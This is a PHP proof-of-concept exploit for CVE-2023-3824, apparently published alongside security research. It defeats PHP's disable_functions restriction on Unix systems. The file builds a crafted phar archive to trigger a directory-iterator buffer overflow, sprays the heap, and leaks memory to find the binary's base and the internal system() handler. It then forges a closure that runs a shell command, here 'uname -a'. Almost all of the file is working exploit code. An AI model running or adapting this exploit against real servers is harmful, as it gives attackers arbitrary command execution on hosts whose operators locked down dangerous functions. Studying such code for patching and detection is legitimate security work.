<?php

# CVE-2023-3824 disable_functions bypass PoC (*nix only)
# Desc: auto discover zif_system address and forgery closure_function.
# Condition: phar.readonly = Off
# Bug: https://github.com/php/php-src/security/advisories/GHSA-jqcx-ccgc-xwhv
# PHP commit: be71cadc2f899bc39fe27098042139392e2187db

gen_phar();
$cmd = "uname -a";

function gen_phar(){
    if (file_exists("poc.phar")) {
        unlink("poc.phar");
    }
    $phar = new Phar('poc.phar');
    $dir_name = str_repeat('C', 0x140 - 0x1);
    $phar->addEmptyDir($dir_name);
    $phar->addFromString($dir_name . DIRECTORY_SEPARATOR . str_repeat('A', PHP_MAXPATHLEN - 1).'B', 'content.');
}

function str2ptr(&$str, $p = 0, $s = 8) {
    $address = 0;
    for($j = $s-1; $j >= 0; $j--) {
        $address <<= 8;
        $address |= ord($str[$p+$j]);
    }
    return $address;
}

function write(&$str, $p, $v, $n = 8) {
    $i = 0;
    for($i = 0; $i < $n; $i++) {
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8;
    }
}

function leak(&$abc, $addr, $p = 0, $s = 8, $debug = 0) {
    global $f;
    write($abc, 0x180, $addr + $p - 0x10);
    $leak = strlen($f->a_1);
    if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
    return $leak;
}

function parse_elf(&$abc,$base) {
    $e_type = leak($abc,$base, 0x10, 2);

    $e_phoff = leak($abc,$base, 0x20);
    $e_phentsize = leak($abc,$base, 0x36, 2);
    $e_phnum = leak($abc,$base, 0x38, 2);

    for($i = 0; $i < $e_phnum; $i++) {
        $header = $base + $e_phoff + $i * $e_phentsize;
        $p_type  = leak($abc,$header, 0, 4);
        $p_flags = leak($abc,$header, 4, 4);
        $p_vaddr = leak($abc,$header, 0x10);
        $p_memsz = leak($abc,$header, 0x28);

        if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
            # handle pie
            $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
            $data_size = $p_memsz;
        } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
            $text_size = $p_memsz;
        }
    }

    if(!$data_addr || !$text_size || !$data_size)
        return false;

    return [$data_addr, $text_size, $data_size];
}

function get_ext_funcs(&$abc, $base, $elf) {
    list($data_addr, $text_size, $data_size) = $elf;
    for($i = 0; $i < $data_size / 8; $i++) {
        $leak = leak($abc, $data_addr, $i * 8, 8, 1);
        if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
            $deref = leak($abc, $leak);
            // 'standard' 字符串
            if($deref != 0x647261646e617473)
                continue;
        } else continue;
        $leak = leak($abc, $data_addr, ($i+1) * 8, 8, 1);
        if($leak - $base > 0 && $leak < $data_addr + $data_size) {
            // PHP8.0 函数存储在 ext_function
            $deref = leak($abc, $leak);
            if($deref - $base > 0 && $deref  <  $data_addr + $data_size) {
                $set_time_limit = leak($abc, $deref);
                if($set_time_limit != 0x656d69745f746573)
                    continue;
            } else continue;
        } else continue;
        return $data_addr + ($i+1) * 8;
    }
    fgets(STDIN);
}

function get_binary_base(&$abc,$binary_leak) {
    $base = 0;
    $start = $binary_leak & 0xfffffffffffff000;
    for($i = 0; $i < 0x1000; $i++) {
        $addr = $start - 0x1000 * $i;
        $leak = leak($abc,$addr, 0, 7);
        if($leak == 0x10102464c457f) { # ELF header
            return $addr;
        }
    }
}

function get_system(&$abc,$basic_funcs) {
    $ext_functions = leak($abc,$basic_funcs);
    do {
        $f_entry = leak($abc,$ext_functions);
        $f_name = leak($abc,$f_entry, 0, 6);
        if($f_name == 0x6d6574737973) { # system
            return leak($abc,$ext_functions + 8);
        }
        $ext_functions += 0x20;
    } while($f_entry != 0);
    return false;
}

function create_RDI()
{
    $it = new RecursiveDirectoryIterator("phar://./poc.phar");
    foreach ($it as $file) {
        if($file->isDir()) {
            break;
        }
    }
    return $it;
}

class Helper {
    public $a_1,$a_2,$a_3,$a_4,$a_5,$a_6,$a_7,$a_8,$a_9,$a_10,$a_11,$a_12,$a_13,$a_14,$a_15;
}

function write8(&$str, $p, $v){
    $str[$p] = chr($v & 0xff);
}

function write64(&$str, $p, $v) {
    $str[$p + 0] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 1] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 2] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 3] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 4] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 5] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 6] = chr($v & 0xff);
    $v >>= 8;
    $str[$p + 7] = chr($v & 0xff);
}

$str_arr = [];
// Reference link: https://www.m4p1e.com/2024/03/01/CVE-2023-3824/
for ($i = 0; $i < 0x2000; $i++) {
    $str_arr[$i] = str_repeat('A', 0x140 - 0x30);
    $str_arr[$i][0] = "I";
    $str_arr[$i][1] = "L";
    $str_arr[$i][2] = "I";
    $str_arr[$i][3] = "K";
    $str_arr[$i][4] = "E";
    $str_arr[$i][5] = "P";
    $str_arr[$i][6] = "H";
    $str_arr[$i][7] = "P";
}

global $f;
while (1) {
    $it = create_RDI();
    $sub_it = $it->getChildren();
    // trigger overflow
    foreach($sub_it as $file) {}

    $data = $sub_it->getSubPath();
    if (substr($data, 0x18, 8) == "ILIKEPHP"){
        unset($sub_it);
        $f = new Helper();
        $f->a_1 = $f;
        $f->a_2 = function ($x) { };
        $f->a_3 = str_repeat('A', 0x140 - 0x30);
        break;
    } else {
        $it_arr[] = $sub_it;
    }
}

for ($i = 0; $i < 0x2000; $i++) {
    // 获取obj指针
    if(strlen($str_arr[$i]) != 272){
        $closure_handlers = str2ptr($str_arr[$i], 0);
        $obj_addr = str2ptr($str_arr[$i], 0x10);
        // this 指针会报错，修改变量值
        $f->a_1 = "";

        # fake value
        write($str_arr[$i], 0x178, 2);
        write($str_arr[$i], 0x188, 6);

        # fake reference
        write($str_arr[$i], 0x10, $obj_addr + 0x190);
        write($str_arr[$i], 0x18, 0xa);

        $closure_obj = str2ptr($str_arr[$i], 0x20);

        $binary_leak = leak($str_arr[$i], $closure_handlers, 8);

        if(!($base = get_binary_base($str_arr[$i],$binary_leak))) {
            die("Couldn't determine binary base address");
        }

        if(!($elf = parse_elf($str_arr[$i],$base))) {
            die("Couldn't parse ELF header");
        }
        // php8 函数存储在 ext_functions 结构中
        if(!($ext_funcs = get_ext_funcs($str_arr[$i],$base, $elf))) {
            die("Couldn't get ext_func address");
        }

        if(!($zif_system = get_system($str_arr[$i],$ext_funcs))) {
            die("Couldn't get zif_system address");
        }

        $fake_obj_offset = 0x198;
        for($j = 0; $j < 0x140; $j += 8) {
            write($str_arr[$i], $fake_obj_offset + $j, leak($str_arr[$i],$closure_obj, $j));
        }

        # pwn
        write($str_arr[$i], 0x20, $obj_addr + $fake_obj_offset+0x18);
        write($str_arr[$i], 0x198 + 0x38, 1,4); # internal func type
        write($str_arr[$i], 0x198 + 0x70, $zif_system); # internal func handler
        ($f->a_2)($cmd);
        break;
    }
}

?>